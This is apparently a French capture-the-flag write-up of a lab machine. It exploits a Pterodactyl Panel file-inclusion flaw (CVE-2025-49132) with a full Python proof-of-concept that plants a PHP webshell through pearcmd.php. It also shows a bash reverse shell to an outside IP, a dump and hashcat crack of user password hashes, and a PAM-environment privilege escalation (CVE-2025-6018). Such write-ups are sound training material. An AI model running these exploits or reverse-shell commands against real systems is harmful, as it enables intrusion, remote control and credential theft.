

![[IMG-20260207225753460.png]]

![[Pasted image 20260207230930.png]]

### [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/cve-2025-49132)

![[Pasted image 20260207232410.png]]

```bash
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=en&namespace=auth" | jq
```

![[Pasted image 20260207233420.png]]

On valide donc que l’endpoint **`/locales/locale.json`** est vulnérable à une **LFI (Local File Inclusion)**.
En effet, cet endpoint charge dynamiquement des fichiers de traduction PHP à partir des paramètres **`locale`** et **`namespace`**. Or, ces paramètres ne sont pas correctement filtrés : il est possible d’y injecter des séquences de traversée de répertoires (`../`) afin de forcer le serveur à inclure d’autres fichiers présents sur le système.

![[Pasted image 20260211005600.png]]

Le comportement observé confirme que le fichier ciblé n’est pas simplement affiché, mais **interprété par PHP** : les fichiers inclus sont exécutés via des fonctions comme `include` ou `require`, puis leur contenu (généralement un tableau retourné par un `return [...]`) est renvoyé sous forme de JSON.

Ainsi, en incluant des fichiers comme `config/database.php`, on parvient à récupérer des informations sensibles (identifiants MySQL, APP_KEY Laravel, configuration Redis…), ce qui prouve que les paramètres fournis dans l’URL sont directement utilisés dans un mécanisme d’inclusion de fichiers côté serveur.

À ce stade, la vulnérabilité est “seulement” une LFI : elle permet de lire et d’exécuter des fichiers locaux, mais pas encore d’exécuter du code arbitraire directement.

Cependant, dès lors qu’un fichier PHP présent sur le serveur peut être inclus, il devient possible d’atteindre une exécution de code si l’on trouve un fichier local exploitable. C’est précisément ici qu’intervient **`pearcmd.php`**, un script installé par défaut sur de nombreuses distributions PHP.

[Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=pearc#via-pearcmdphp--url-args)
![[Pasted image 20260211012004.png]]

Ce script peut interpréter certains paramètres passés dans l’URL comme des arguments de commande, ce qui permet à un attaquant de détourner ses fonctionnalités (notamment `config-create`) afin d’écrire un fichier PHP malveillant sur le serveur (ex: `/tmp/shell.php`). Une fois ce fichier créé, il suffit ensuite de l’inclure via la LFI pour déclencher son exécution.

On créé don un script python pour obtenir une RCE:
```python
import os  
import requests  
import subprocess  
import argparse  
import base64  
  
  
def exploit(target, cmd):  
target = target.rstrip("/")  
fname = "x" + os.urandom(4).hex()  
  
pear_dir = "/usr/share/php/PEAR"  
  
# base64 encode (URL safe)  
b64cmd = base64.urlsafe_b64encode(cmd.encode()).decode()  
  
host = target.replace("http://", "").replace("https://", "")  
  
write_payload = (  
f'curl -s -g "{host}/locales/locale.json'  
f'?+config-create+/'  
f'&locale=../../../../../../{pear_dir.strip("/")}'  
f'&namespace=pearcmd'  
f"&/<?=system(base64_decode('{b64cmd}'))?>+/tmp/{fname}.php\""  
)  
  
subprocess.run(write_payload, shell=True, capture_output=True)  
  
exec_url = f"{target}/locales/locale.json?locale=../../../../../../tmp&namespace={fname}"  
r = requests.get(exec_url)  
  
print(r.text[:2000])  
  
  
if __name__ == "__main__":  
parser = argparse.ArgumentParser()  
parser.add_argument("target")  
parser.add_argument("--cmd", required=True)  
args = parser.parse_args()  
  
exploit(args.target, args.cmd)
```

Ce script automatise l’exploitation de **CVE-2025-49132** sur Pterodactyl Panel, en combinant :
- une **LFI (Local File Inclusion)** via `/locales/locale.json`
- et une **RCE indirecte** en abusant de `pearcmd.php`

L’objectif est de **créer un fichier PHP malveillant sur le serveur**, puis de **l’inclure** via la LFI afin qu’il soit exécuté.

Cette requête est la partie la plus importante du PoC.

#### Ce que ça fait :
- Le endpoint `/locales/locale.json` est vulnérable à un **include() contrôlé**
- On force l’application à inclure `pearcmd.php`
- `pearcmd.php` interprète certains paramètres comme des arguments CLI
- L’option `config-create` permet d’écrire un fichier sur le système

Donc l’URL injectée revient à exécuter quelque chose comme :
`pearcmd.php config-create /tmp/x1234.php "<?php payload ?>"`

Le payload écrit dans `/tmp/{fname}.php` est :
`<?=system(base64_decode('...'))?>`

Ce qui permet d’exécuter une commande système.

![[Pasted image 20260211020023.png]]

On utilise à présent cette commande:
```bash
python3 poc.py http://panel.pterodactyl.htb --cmd "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.214/4444 0>&1'"
```

![[Pasted image 20260211020133.png]]

Puisque l’application Laravel (Pterodactyl) arrive à communiquer avec la base de données, on peut utiliser Laravel comme “proxy” pour exécuter des requêtes SQL.

On utilise alors `php artisan tinker`, qui permet d’exécuter du code PHP dans le contexte de l’application, avec la connexion DB déjà configurée :
```
cd /var/www/pterodactyl
php artisan tinker
```

Ensuite on exécute des requêtes SQL via la façade Laravel `DB` :
```bash
DB::select("SHOW DATABASES;");
DB::select("SHOW TABLES;");
DB::select("DESCRIBE users;");
DB::select("SELECT id, username, email, password, root_admin FROM users;");
```

On trouve ces infos:
```bash
DB::select("SELECT id, username, email, password, root_admin FROM users;");  
= [  
{#5591  
+"id": 2,  
+"username": "headmonitor",  
+"email": "headmonitor@pterodactyl.htb",  
+"password": "$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2",  
+"root_admin": 1,  
},  
{#5590  
+"id": 3,  
+"username": "phileasfogg3",  
+"email": "phileasfogg3@pterodactyl.htb",  
+"password": "$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi",  
+"root_admin": 0,  
},  
]  
```

![[IMG-20260211024111533.png]]

```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -D 2 -O -w 3
```

Résultat:
```
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```

![[IMG-20260211024242947.png]]

## Privesc

```bash
phileasfogg3@pterodactyl:~> ls -la /var/spool/mail  
total 4  
drwxrwxrwt 1 root         root  46 Nov  7 18:41 .  
drwxr-xr-x 1 root         root 108 Sep 12 23:10 ..  
-rw-rw---- 1 headmonitor  mail   0 Nov  7 15:54 headmonitor  
-rw-rw---- 1 phileasfogg3 mail 960 Dec 29 15:58 phileasfogg3
  
phileasfogg3@pterodactyl:~> cat /var/spool/mail/phileasfogg3  

From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025  
Delivered-To: phileasfogg3@pterodactyl  
Received: by pterodactyl (Postfix, from userid 0)  
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)  
From: headmonitor headmonitor@pterodactyl  
To: All Users all@pterodactyl  
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)  
Message-ID: 202511070915.headmonitor@pterodactyl  
Date: Fri, 07 Nov 2025 09:15:00 +0100  
MIME-Version: 1.0  
Content-Type: text/plain; charset="utf-8"  
Content-Transfer-Encoding: 7bit  
  
Attention all users,  
  
Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but incr  
eased vigilance is required.  
  
Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review  
udisks and system logs and apply pending updates.  
  
Report any signs of compromise immediately to headmonitor@pterodactyl.htb  
  
— HeadMonitor  
System Administrator
```

Important:
```
“SECURITY NOTICE — Unusual udisksd activity”
```

Identifier udisksd et sa version:
```
ps aux | grep udisksd
busctl --system introspect org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager
systemctl status udisks2
```

![[IMG-20260211145430674.png]]

```
Version = "2.9.2"
```

On trouve alors deux CVE pour cette version: https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available
### CVE-2025-6018

Cette CVE concerne openSUSE / SLES :
- bug PAM/logind
- permet à un user SSH de se faire considérer comme un utilisateur “physiquement actif”
- ce qui donne le droit polkit `allow_active`

Donc au lieu d’avoir “auth_admin”, on peut avoir accès à certaines actions polkit **sans password root**.

### CVE-2025-6019

Cette CVE concerne libblockdev/udisks :

- udisksd monte temporairement un filesystem XFS dans `/tmp/blockdev.*`
- le montage est fait de manière insecure (pas de `nosuid`)
- donc un binaire SUID présent dans l’image peut être exécuté et donne root

Elle nécessite justement d’avoir les droits polkit “allow_active” pour déclencher certaines opérations (Resize etc).

### Exploitation de CVE-2025-6018 (PAM Environment trick)

On vérifie notre état avant exploit :

```
gdbus call --system \
  --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
```

![[IMG-20260211150001384.png]]

Résultat initial :
```
('challenge',)
```

Ça signifie : **polkit exige une authentification**.

#### Exploit
On crée un fichier PAM spécial :
```
cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
EOF
```

On se déconnecte et on se reconnecte en SSH. Puis on refait le meme test:
![[IMG-20260211150356960.png]]
Cette fois :
```
('yes',)
```
Ça prouve que polkit nous considère comme **active local user**.

Donc **CVE-2025-6018 est validée**.

Ansi udisksctl devient utilisable sans mot de passe root
On retente :
```
udisksctl loop-setup -f /tmp/disk.img
```



![[IMG-20260211144247163.png]]
